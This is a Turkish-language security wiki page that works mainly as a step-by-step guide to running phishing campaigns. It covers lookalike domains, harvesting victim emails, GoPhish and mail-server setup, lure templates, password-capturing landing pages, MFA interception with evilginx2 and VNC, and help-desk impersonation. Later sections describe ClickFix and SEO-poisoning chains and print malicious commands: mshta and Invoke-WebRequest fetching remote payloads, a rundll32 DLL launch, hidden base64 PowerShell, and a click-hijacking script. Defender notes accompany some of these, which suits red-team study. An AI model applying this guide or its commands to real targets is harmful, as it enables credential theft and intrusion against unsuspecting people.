# Phishing Metodolojisi

{{#include ../../banners/hacktricks-training.md}}

## Metodoloji

1. Mağduru keşfedin
1. **Mağdur domainini** seçin.
2. Mağdur tarafından kullanılan **login portallarını arayarak** temel web enumeration işlemleri gerçekleştirin ve hangisini **taklit edeceğinize** **karar verin**.
3. **E-posta adreslerini bulmak** için bazı **OSINT** yöntemlerini kullanın.
2. Ortamı hazırlayın
1. Phishing değerlendirmesinde kullanacağınız **domaini satın alın**
2. E-posta hizmetiyle ilgili kayıtları (SPF, DMARC, DKIM, rDNS) **yapılandırın**
3. VPS'i **gophish** ile yapılandırın
3. Campaign'i hazırlayın
1. **E-posta şablonunu** hazırlayın
2. Kimlik bilgilerini çalacak **web sayfasını** hazırlayın
4. Campaign'i başlatın!

## Benzer domain adları oluşturma veya güvenilir bir domain satın alma

### Domain Adı Değiştirme Teknikleri

- **Keyword**: Domain adı, orijinal domainin önemli bir **keyword'ünü içerir** (ör. zelster.com-management.com).<sup>[[1]](#references)</sup>
- **Tireli subdomain**: Bir subdomainin **noktasını tireyle değiştirin** (ör. www-zelster.com).
- **Yeni TLD**: **Yeni bir TLD** kullanan aynı domain (ör. zelster.org)
- **Homoglyph**: Domain adındaki bir harfi **benzer görünen harflerle değiştirir** (ör. zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** Domain adı içindeki **iki harfin yerini değiştirir** (ör. zelsetr.com).
- **Tekilleştirme/Çoğullaştırma**: Domain adının sonuna “s” ekler veya sondaki “s” harfini kaldırır (ör. zeltsers.com).
- **Atlama**: Domain adındaki harflerden **birini kaldırır** (ör. zelser.com).
- **Tekrarlama:** Domain adındaki harflerden **birini tekrarlar** (ör. zeltsser.com).
- **Değiştirme**: Homoglyph'e benzer ancak daha az stealthy'dir. Domain adındaki harflerden birini, orijinal harfin klavye üzerindeki yakınındaki bir harfle değiştirebilir (ör. zektser.com).
- **Subdomained**: Domain adının içine bir **nokta** ekler (ör. ze.lster.com).
- **Ekleme**: Domain adına bir harf **ekler** (ör. zerltser.com).
- **Eksik nokta**: TLD'yi domain adına ekler (ör. zelstercom.com)

**Automatic Tools**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Websites**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

Güneş patlamaları, kozmik ışınlar veya donanım hataları gibi çeşitli faktörler nedeniyle depolanan veya iletişim hâlindeki bitlerden bazılarının **otomatik olarak değişme ihtimali vardır**.

Bu kavram **DNS isteklerine uygulandığında**, **DNS sunucusu tarafından alınan domainin**, başlangıçta istenen domain ile aynı olmaması mümkündür.

Örneğin, "windows.com" domaininde tek bir bitin değiştirilmesi onu "windnws.com" olarak değiştirebilir.

Saldırganlar, mağdurun domainine benzeyen birden fazla bit-flipping domaini **kaydederek bu durumdan yararlanabilir**. Amaçları, meşru kullanıcıları kendi altyapılarına yönlendirmektir.

Daha fazla bilgi için [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/) adresini okuyun.<sup>[[10]](#references)[[11]](#references)</sup>

### Güvenilir bir domain satın alma

Kullanabileceğiniz süresi dolmuş bir domaini [https://www.expireddomains.net/](https://www.expireddomains.net) adresinde arayabilirsiniz.\
Satın alacağınız süresi dolmuş domainin **zaten iyi bir SEO'ya sahip olduğundan** emin olmak için aşağıdaki servislerde nasıl kategorize edildiğini kontrol edebilirsiniz:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## E-postaları Keşfetme

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (%100 ücretsiz)
- [https://phonebook.cz/](https://phonebook.cz) (%100 ücretsiz)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

Daha fazla geçerli e-posta adresi **keşfetmek** veya daha önce keşfettiklerinizi **doğrulamak** için mağdurun SMTP sunucularına brute-force uygulayıp uygulayamayacağınızı kontrol edebilirsiniz. [E-posta adreslerini nasıl doğrulayacağınızı/keşfedeceğinizi buradan öğrenin](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
Ayrıca kullanıcılar e-postalarına erişmek için **herhangi bir web portalı kullanıyorsa**, bu portalın **username brute force** saldırılarına karşı savunmasız olup olmadığını kontrol etmeyi ve mümkünse bu zafiyeti exploit etmeyi unutmayın.

## GoPhish'i Yapılandırma

### Kurulum

Bunu [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0) adresinden indirebilirsiniz.

İndirin, `/opt/gophish` içinde decompress edin ve `/opt/gophish/gophish` dosyasını çalıştırın.\
Çıktıda, 3333 portundaki admin kullanıcısı için bir password verilecektir. Bu nedenle ilgili porta erişin ve admin password'ünü değiştirmek için bu credentials'ları kullanın. Bu portu local'e tunnel etmeniz gerekebilir:
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### Yapılandırma

**TLS sertifikası yapılandırması**

Bu adımdan önce kullanacağınız **domain'i satın almış** olmanız ve domain'in, **gophish** yapılandırmasını yaptığınız **VPS'in IP adresine yönlendirilmiş** olması gerekir.
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**Mail yapılandırması**

Kurulumu başlatın: `apt-get install postfix`

Ardından domain'i aşağıdaki dosyalara ekleyin:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**/etc/postfix/main.cf** içindeki aşağıdaki değişkenlerin değerlerini de değiştirin:

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Son olarak **`/etc/hostname`** ve **`/etc/mailname`** dosyalarını domain adınızla değiştirin ve **VPS'nizi yeniden başlatın.**

Şimdi, `mail.<domain>` için VPS'nin **IP adresine** işaret eden bir **DNS A record** ve `mail.<domain>` adresine işaret eden bir **DNS MX** record oluşturun.

Şimdi bir e-posta göndermeyi test edelim:
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Gophish yapılandırması**

Gophish'in çalışmasını durdurun ve yapılandıralım.\
`/opt/gophish/config.json` dosyasını aşağıdaki şekilde değiştirin (`https` kullanımına dikkat edin):
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**gophish service Yapılandırması**

gophish service'ini oluşturarak otomatik olarak başlatılmasını ve bir service olarak yönetilmesini sağlamak için aşağıdaki içeriğe sahip `/etc/init.d/gophish` dosyasını oluşturabilirsiniz:
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
Hizmeti yapılandırmayı ve kontrol etmeyi şu şekilde tamamlayın:
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## Posta sunucusunu ve domain'i yapılandırma

### Bekleyin ve meşru görünün

Bir domain ne kadar eskiyse spam olarak yakalanma olasılığı o kadar düşüktür. Bu nedenle phishing assessment işleminden önce mümkün olduğunca uzun süre (en az 1 hafta) beklemelisiniz. Ayrıca, itibarlı bir sektör hakkında bir sayfa oluşturursanız elde edilen itibar daha iyi olacaktır.

Bir hafta beklemeniz gerekse bile her şeyi şimdi yapılandırmayı tamamlayabileceğinizi unutmayın.

### Reverse DNS (rDNS) kaydını yapılandırma

VPS'nin IP adresini domain adına çözecek bir rDNS (PTR) kaydı ayarlayın.

### Sender Policy Framework (SPF) kaydı

**Yeni domain için bir SPF kaydı yapılandırmalısınız**. SPF kaydının ne olduğunu bilmiyorsanız [**bu sayfayı okuyun**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

SPF policy'nizi oluşturmak için [https://www.spfwizard.net/](https://www.spfwizard.net) kullanabilirsiniz (VPS makinesinin IP adresini kullanın)

![Phishing domain'i için SPF kaydı oluşturmaya yönelik SPF Wizard formu](<../../images/image (1037).png>)

Bu, domain içinde bir TXT kaydına ayarlanması gereken içeriktir:
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### Domain-based Message Authentication, Reporting & Conformance (DMARC) Kaydı

**Yeni domain için bir DMARC kaydı yapılandırmalısınız**. DMARC kaydının ne olduğunu bilmiyorsanız [**bu sayfayı okuyun**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

`_dmarc.<domain>` hostname'ine işaret eden, aşağıdaki içeriğe sahip yeni bir DNS TXT kaydı oluşturmalısınız:
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

**Yeni domain için bir DKIM yapılandırmalısınız**. DMARC kaydının ne olduğunu bilmiyorsanız [**bu sayfayı okuyun**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

Bu öğretici şu kaynağı temel almaktadır: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy).<sup>[[5]](#references)</sup>

> [!TIP]
> DKIM anahtarının oluşturduğu her iki B64 değerini birleştirmeniz gerekir:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### E-posta yapılandırma puanınızı test edin

Bunu [https://www.mail-tester.com/](https://www.mail-tester.com) kullanarak yapabilirsiniz\
Sayfaya erişin ve size verilen adrese bir e-posta gönderin:
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
Ayrıca `check-auth@verifier.port25.com` adresine bir e-posta **gönderip** ve **yanıtı okuyarak** **e-posta yapılandırmanızı kontrol edebilirsiniz** (bunun için **25** numaralı portu **açmanız** ve e-postayı root olarak gönderirseniz yanıtı _/var/mail/root_ dosyasında görmeniz gerekir).\
Tüm testleri geçtiğinizden emin olun:
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
Ayrıca **kontrolünüz altındaki bir Gmail adresine mesaj gönderebilir** ve Gmail gelen kutunuzdaki **e-postanın header'larını** kontrol edebilirsiniz; `Authentication-Results` header alanında `dkim=pass` bulunmalıdır.
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### ​Spamhouse Blacklist'ten Kaldırma

[www.mail-tester.com](https://www.mail-tester.com) sayfası, domain'inizin spamhouse tarafından engellenip engellenmediğini gösterebilir. Domain/IP adresinizin kaldırılmasını şu adresten talep edebilirsiniz: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Microsoft Blacklist'ten Kaldırma

​​Domain/IP adresinizin kaldırılmasını [https://sender.office.com/](https://sender.office.com) adresinden talep edebilirsiniz.

## GoPhish Campaign Oluşturma ve Başlatma

### Sending Profile

- Gönderici profilini tanımlamak için bir **isim** belirleyin
- Phishing e-postalarını hangi hesaptan göndereceğinize karar verin. Öneriler: _noreply, support, servicedesk, salesforce..._
- Kullanıcı adı ve parolayı boş bırakabilirsiniz, ancak Ignore Certificate Errors seçeneğini işaretlediğinizden emin olun

![GoPhish Campaign Oluşturma ve Başlatma - Sending Profile: Kullanıcı adı ve parolayı boş bırakabilirsiniz, ancak Ignore Certificate Errors seçeneğini işaretlediğinizden emin olun](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> Her şeyin çalıştığını test etmek için "**Send Test Email**" işlevini kullanmanız önerilir.\
> Testler sırasında blacklist'e alınmaktan kaçınmak için test e-postalarını **10min mail adreslerine** göndermenizi öneririm.

### Email Template

- Template'i tanımlamak için bir **isim** belirleyin
- Ardından bir **konu** yazın (sıradışı bir şey olmasın; normal bir e-postada okumayı bekleyebileceğiniz bir konu yazın)
- "**Add Tracking Image**" seçeneğini işaretlediğinizden emin olun
- **Email Template**'i yazın (aşağıdaki örnekte olduğu gibi değişkenleri kullanabilirsiniz):
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
E-postanın **güvenilirliğini artırmak için**, istemciden gelen bir e-postadaki imzalardan birini kullanmanız önerilir. Öneriler:

- **Var olmayan bir adrese** e-posta gönderin ve yanıtın herhangi bir imza içerip içermediğini kontrol edin.
- info@ex.com, press@ex.com veya public@ex.com gibi **herkese açık e-postaları** arayın, bunlara bir e-posta gönderin ve yanıtı bekleyin.
- **Keşfedilmiş geçerli** bir e-posta ile iletişime geçmeyi deneyin ve yanıtı bekleyin.

![Sending Profile - Email Template: Try to contact some valid discovered email and wait for the response](<../../images/image (80).png>)

> [!TIP]
> Email Template ayrıca **gönderilecek dosyaların eklenmesine** de olanak tanır. Özel olarak hazırlanmış bazı dosyalar/belgeler kullanarak NTLM challenge'larını çalmak istiyorsanız [bu sayfayı okuyun](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Landing Page

- Bir **ad** yazın.
- Web sayfasının **HTML kodunu yazın**. Web sayfalarını **içe aktarabileceğinizi** unutmayın.
- **Capture Submitted Data** ve **Capture Passwords** seçeneklerini işaretleyin.
- Bir **redirection** ayarlayın.

![Email Template - Landing Page: Mark Capture Submitted Data and Capture Passwords](<../../images/image (826).png>)

> [!TIP]
> Genellikle sayfanın HTML kodunu değiştirmeniz ve **sonuçlardan memnun kalana kadar** yerel ortamda (belki bir Apache server kullanarak) bazı testler yapmanız gerekir.\
> HTML için bazı **statik kaynakları** (belki bazı CSS ve JS sayfalarını) kullanmanız gerekiyorsa bunları _**/opt/gophish/static/endpoint**_ konumuna kaydedebilir ve ardından _**/static/\<filename>**_ üzerinden erişebilirsiniz.

> [!TIP]
> Redirection için **kullanıcıları kurbanın meşru ana web sayfasına** yönlendirebilir veya örneğin onları _/static/migration.html_ sayfasına yönlendirip 5 saniye boyunca bir **dönen yükleme simgesi (**[**https://loading.io/**](https://loading.io)**) gösterebilir ve ardından işlemin başarılı olduğunu belirtebilirsiniz**.

### Users & Groups

- Bir ad belirleyin.
- **Verileri içe aktarın** (örnekteki template'i kullanmak için her kullanıcının firstname, last name ve email address bilgilerinin gerekli olduğunu unutmayın).

![Landing Page - Users & Groups: Import the data (note that in order to use the template for the example you need the firstname, last name and email address of each user)](<../../images/image (163).png>)

### Campaign

Son olarak bir ad, email template, landing page, URL, sending profile ve group seçerek bir campaign oluşturun. URL'nin kurbanlara gönderilecek bağlantı olacağını unutmayın.

**Sending Profile'ın, son phishing e-postasının nasıl görüneceğini görmek için bir test e-postası göndermenize olanak tanıdığını** unutmayın:

![Users & Groups - Campaign: Note that the Sending Profile allow to send a test email to see how will the final phishing email looks like](<../../images/image (192).png>)

Her şey hazır olduğunda campaign'i başlatın!

## Website Cloning

Herhangi bir nedenle web sitesini clone etmek istiyorsanız aşağıdaki sayfaya bakın:


{{#ref}}
clone-a-website.md
{{#endref}}

## Backdoored Documents & Files

Bazı phishing assessment'larında (özellikle Red Teams için) bir tür **backdoor içeren dosyalar** (belki bir C2 veya yalnızca bir authentication tetikleyecek bir dosya) **göndermek** de isteyebilirsiniz.\
Bazı örnekler için aşağıdaki sayfaya göz atın:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Via Proxy MitM

Önceki attack oldukça zekicedir; gerçek bir web sitesini taklit eder ve kullanıcı tarafından girilen bilgileri toplarsınız. Ne yazık ki kullanıcı doğru parolayı girmediyse veya taklit ettiğiniz application 2FA ile yapılandırılmışsa, **bu bilgiler kandırılan kullanıcıyı taklit etmenize olanak sağlamaz**.

[**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) ve [**muraena**](https://github.com/muraenateam/muraena) gibi araçlar bu noktada kullanışlıdır. Bu tool, MitM benzeri bir attack oluşturmanıza olanak tanır. Temel olarak attack şu şekilde işler:

1. Gerçek web sayfasının **login** formunu **taklit edersiniz**.
2. Kullanıcı **credentials** bilgilerini fake sayfanıza **gönderir** ve tool bunları gerçek web sayfasına göndererek **credentials bilgilerinin çalışıp çalışmadığını kontrol eder**.
3. Account 2FA ile yapılandırılmışsa MitM sayfası bunu ister ve **kullanıcı girdiğinde** tool bunu gerçek web sayfasına gönderir.
4. Kullanıcı authentication işlemini tamamladığında siz (attacker olarak), tool MitM gerçekleştirirken yapılan her etkileşime ait **credentials, 2FA, cookie ve tüm bilgileri yakalamış** olursunuz.

### Via VNC

Kurbanı orijinal web sitesiyle aynı görünüme sahip **kötü amaçlı bir sayfaya göndermek** yerine, gerçek web sayfasına bağlı bir browser içeren bir **VNC session'a gönderirseniz** ne olur? Kullanıcının ne yaptığını görebilir, parolayı, kullanılan MFA'yı, cookie'leri ve diğer bilgileri çalabilirsiniz...\
Bunu [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC) ile yapabilirsiniz.<sup>[[3]](#references)[[4]](#references)</sup>

## Detecting the detection

Busted olup olmadığınızı anlamanın en iyi yollarından biri, **domain'inizi blacklist'lerde aramaktır**. Listeleniyorsa domain'iniz bir şekilde şüpheli olarak tespit edilmiştir.\
Domain'inizin herhangi bir blacklist'te görünüp görünmediğini kontrol etmenin kolay bir yolu [https://malwareworld.com/](https://malwareworld.com) kullanmaktır.

Ancak kurbanın **açık ortamda şüpheli phishing activity arayıp aramadığını** anlamanın başka yolları da vardır; bunlar aşağıdaki sayfada açıklanmıştır:


{{#ref}}
detecting-phising.md
{{#endref}}

Kurbanın domain'ine **çok benzeyen bir domain satın alabilir** ve/veya sizin kontrolünüzdeki bir domain'in **subdomain'i için**, kurbanın domain'inin **keyword'ünü içeren** bir **certificate oluşturabilirsiniz**. **Kurban** bunlarla herhangi bir **DNS veya HTTP interaction** gerçekleştirirse, şüpheli domain'leri **aktif olarak aradığını** anlayabilir ve çok daha gizli hareket etmeniz gerekir.<sup>[[2]](#references)</sup>

### Evaluate the phishing

E-postanızın spam folder'a düşüp düşmeyeceğini veya engellenip engellenmeyeceğini ya da başarılı olup olmayacağını değerlendirmek için [**Phishious** ](https://github.com/Rices/Phishious)kullanın.

## High-Touch Identity Compromise (Help-Desk MFA Reset)

Modern intrusion set'ler, email lure'larını tamamen atlayarak MFA'yı etkisiz hale getirmek için giderek daha fazla **service-desk / identity-recovery workflow'unu doğrudan hedefliyor**. Attack tamamen "living-off-the-land" yaklaşımındadır: operator geçerli credentials bilgilerine sahip olduğunda, built-in admin tooling ile pivot eder; malware gerekmez.<sup>[[6]](#references)</sup>

### Attack flow
1. Kurban hakkında reconnaissance yapın.
* LinkedIn, data breach'leri, public GitHub vb. kaynaklardan kişisel ve kurumsal bilgileri toplayın.
* Yüksek değerli identity'leri (yöneticiler, IT, finance) belirleyin ve parola / MFA reset işlemi için **tam help-desk sürecini** çıkarın.
2. Real-time social engineering
* Hedefin kimliğine bürünerek help-desk'i telefon, Teams veya chat üzerinden arayın (genellikle **spoofed caller-ID** veya **cloned voice** kullanarak).
* Knowledge-based verification'ı geçmek için daha önce toplanan PII'ı sağlayın.
* Agent'ı **MFA secret'ını resetlemeye** veya kayıtlı bir mobile number üzerinde **SIM-swap** gerçekleştirmeye ikna edin.
3. Immediate post-access actions (gerçek vakalarda ≤60 dakika)
* Herhangi bir web SSO portalı üzerinden foothold oluşturun.
* Built-in araçlarla AD / AzureAD'yi enumerate edin (binary bırakılmaz):
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* Ortamda zaten whitelist'e alınmış **WMI**, **PsExec** veya meşru **RMM** agent'larıyla lateral movement gerçekleştirin.

### Detection & Mitigation
* Help-desk identity recovery işlemini **privileged operation** olarak değerlendirin; step-up auth ve manager approval gerektirin.
* Aşağıdaki durumlarda alert üreten **Identity Threat Detection & Response (ITDR)** / **UEBA** kuralları uygulayın:
* MFA method değiştirildi + yeni device / geo üzerinden authentication.
* Aynı principal'ın anında elevation edilmesi (user-→-admin).
* Help-desk çağrılarını kaydedin ve herhangi bir reset işleminden önce **önceden kayıtlı bir number'a call-back** yapılmasını zorunlu kılın.
* Yeni resetlenen account'ların yüksek ayrıcalıklı token'ları otomatik olarak devralmaması için **Just-In-Time (JIT) / Privileged Access** uygulayın.

---

## At-Scale Deception – SEO Poisoning & “ClickFix” Campaigns
Commodity crew'lar, **search engine'leri ve ad network'leri delivery channel'a** dönüştüren mass attack'lerle high-touch operation maliyetini dengeler.<sup>[[6]](#references)</sup>

1. **SEO poisoning / malvertising**, `chromium-update[.]site` gibi sahte bir sonucu search ad'lerinin en üstüne taşır.
2. Kurban küçük bir **first-stage loader** (çoğunlukla JS/HTA/ISO) indirir. Unit 42 tarafından görülen örnekler:
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. Loader, browser cookie'lerini ve credential DB'lerini exfiltrate eder, ardından gerçek zamanlı olarak deploy edilip edilmeyeceğine karar veren bir **silent loader** indirir:
* RAT (ör. AsyncRAT, RustDesk)
* ransomware / wiper
* persistence component (registry Run key + scheduled task)

### Hardening tips
* Yeni kayıt edilmiş domain'leri engelleyin ve e-mail'in yanı sıra *search-ad'ler* üzerinde de **Advanced DNS / URL Filtering** uygulayın.
* Software installation işlemlerini signed MSI / Store package'leriyle sınırlandırın; `HTA`, `ISO`, `VBS` çalıştırılmasını policy ile engelleyin.
* Installer açan browser child process'lerini izleyin:
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* First-stage loader'lar tarafından sıkça kötüye kullanılan LOLBin'leri (ör. `regsvr32`, `curl`, `mshta`) hunt edin.

### Download-button click hijacking with TDS handoff
Bazı sahte software portal'ları, görünür download `href` değerini **gerçek GitHub/release URL'sine** yönlendirmeye devam eder; ancak JavaScript ile kullanıcının **ilk interaction'ını hijack eder** ve bunun yerine kurbanı bir **Traffic Distribution System (TDS)** chain'ine gönderir.<sup>[[9]](#references)</sup>
```javascript
const cachedOpen = window.open;
document.addEventListener(isChromeDesktop() ? "mousedown" : "click", (e) => {
if (!isEligibleClick(e.target)) return;
cachedOpen(generateRuntimeURL({referrer: location.href, userDestination: extractClickedLink(e.target)}));
e.stopImmediatePropagation();
e.preventDefault();
}, true);
```
Temel özellikler:
- Hook genellikle `document` üzerinde **capture phase** (`true`) içinde çalışır; bu nedenle site handler'larından önce tetiklenir.
- Chrome, yönlendirmeyi geçerli bir **user gesture** ile ilişkilendirmek ve popup engelleyicilerini aşma olasılığını artırmak için çoğunlukla `click` yerine `mousedown` kullanır.
- Bazı varyantlar `about:blank` sayfasını önceden açar veya `<a target="_blank">` tıklamalarını taklit eder ve TDS URL'sini yalnızca daha sonra atar.
- Browser-side limitler çoğunlukla `localStorage` içinde tutulur; bu nedenle **ilk tıklama** malware'e ulaşabilirken yenilemeler/yeniden denemeler benign görünümlü görünür bağlantıya geri dönebilir.
- TDS; referrer, giriş domain'i, GEO, browser/device fingerprint, VPN/datacenter kontrolleri, tıklama bağlamı ve session başına sayaçlara göre filtreleme yapabilir. Bu da analyst replay'lerini deterministik olmaktan çıkarır.

Defender fikirleri:
- **Görüntülenen** `href` ile tıklama anında oluşturulan **gerçek** navigation target'ını karşılaştırın.
- `window.open`, `about:blank` veya synthetic anchor click'leri çevresinde hem `preventDefault()` hem de `stopImmediatePropagation()` çağıran `document.addEventListener(..., true)` handler'larını arayın.
- Aynı CloudFront/JS stage'ini yükleyen, yeni register edilmiş software-download domain kümelerini yüksek sinyalli bir SEO-poisoning/TDS pattern'i olarak değerlendirin.

### Fake verification pages + archive-looking LOLBAS fetches üzerinden ClickFix
Bazı TDS branch'leri, kurbana aşağıdaki gibi güvenilir bir Windows binary'sini çalıştırmasını söyleyen fake verification page ile (Cloudflare/IUAM tarzı) sonuçlanır:<sup>[[9]](#references)</sup>
```cmd
C:\Windows\SysWOW64\mshta.exe https://example[.]com/navy.7z
```
Notlar:
- `mshta.exe`, URL bir `.7z` arşivi gibi görünse bile yanıtın **başındaki HTA/VBScript'i** çalıştırır; sonuna eklenen arşiv verileri tamamen aldatmaca olabilir.
- Sonraki aşamalar genellikle dosya türü hakkında yalan söylemeye devam eder (`.rtf` for PowerShell, `.asar` for Python, doldurulmuş binary'lere sahip ZIP'ler) ve ardından **manual PE mapping / in-memory execution** yöntemine geçer.
- Bu zincirlerden birine yanıt veriyorsanız, **ilk başarılı çalıştırmadan itibaren network + memory verilerini** koruyun: sonraki tekrar çalıştırmalar yalnızca zararsız bir installer/SFX yolu gösterebilir veya payload/key release original TDS session'a bağlı olduğu için başarısız olabilir.

### ClickFix DLL delivery tradecraft (fake CERT update)
* Lure: **Update** düğmesi içeren, ulusal CERT duyurusunun klonlanmış bir kopyası; bu düğme adım adım “fix” talimatlarını gösterir. Victim'lere bir DLL indiren ve bunu `rundll32` üzerinden çalıştıran bir batch çalıştırmaları söylenir.<sup>[[12]](#references)</sup>
* Typical batch chain observed:
```cmd
echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
echo timeout /t 10
echo rundll32.exe "%TEMP%\notepad2.dll",notepad
```
* `Invoke-WebRequest`, payload'ı `%TEMP%` konumuna bırakır; kısa bir bekleme network jitter'ını gizler, ardından `rundll32` export edilmiş entrypoint'i (`notepad`) çağırır.
* DLL, host identity bilgilerini beacon eder ve birkaç dakikada bir C2'yi poll eder. Remote tasking, hidden olarak ve policy bypass ile çalıştırılan **base64-encoded PowerShell** biçiminde gelir:
```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
```
* Bu yöntem C2 esnekliğini korur (server, DLL'yi güncellemeden task'leri değiştirebilir) ve console window'larını gizler. `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression` ifadelerini birlikte kullanan `rundll32.exe` child process'leri olan PowerShell süreçlerini hunt edin.
* Defenders, DLL load sonrasında `...page.php?tynor=<COMPUTER>sss<USER>` biçimindeki HTTP(S) callback'lerini ve 5 dakikalık polling aralıklarını arayabilir.

---

